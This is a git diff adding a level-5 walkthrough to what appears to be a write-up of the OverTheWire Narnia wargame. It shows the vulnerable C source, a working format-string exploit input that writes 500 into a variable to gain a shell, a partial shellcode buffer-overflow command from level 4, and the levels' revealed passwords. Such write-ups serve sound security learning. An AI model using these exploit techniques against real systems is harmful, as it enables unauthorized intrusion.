@@ -219,3 +219,46 @@ $ /games/narnia/narnia4 `python -c 'print "\x90"*219+"\x31\xc0\x99\xb0\x0b\x52\x
 $ cat /etc/narnia_pass/narnia5
 faimahchiy
 ```
+
+## level 5
+
+```
+$ cat /games/narnia/narnia5.c
+```
+
+```cpp
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+ 
+int main(int argc, char **argv){
+    int i = 1;
+    char buffer[64];
+
+    snprintf(buffer, sizeof buffer, argv[1]);
+    buffer[sizeof (buffer) - 1] = 0;
+    printf("Change i's value from 1 -> 500. ");
+
+    if(i==500){
+        printf("GOOD\n");
+        system("/bin/sh");
+    }
+
+    printf("No way...let me give you a hint!\n");
+    printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
+    printf ("i = %d (%p)\n", i, &i);
+    return 0;
+}
+```
+
+This is a format string vulnerability challenge.
+
+```
+$ /games/narnia/narnia5 $(python -c 'print "\xcc\xd6\xff\xff"')%x%x%x%472u%n
+Change i's value from 1 -> 500. GOOD
+```
+
+```
+$ cat /etc/narnia_pass/narnia6
+neezocaeng
+```
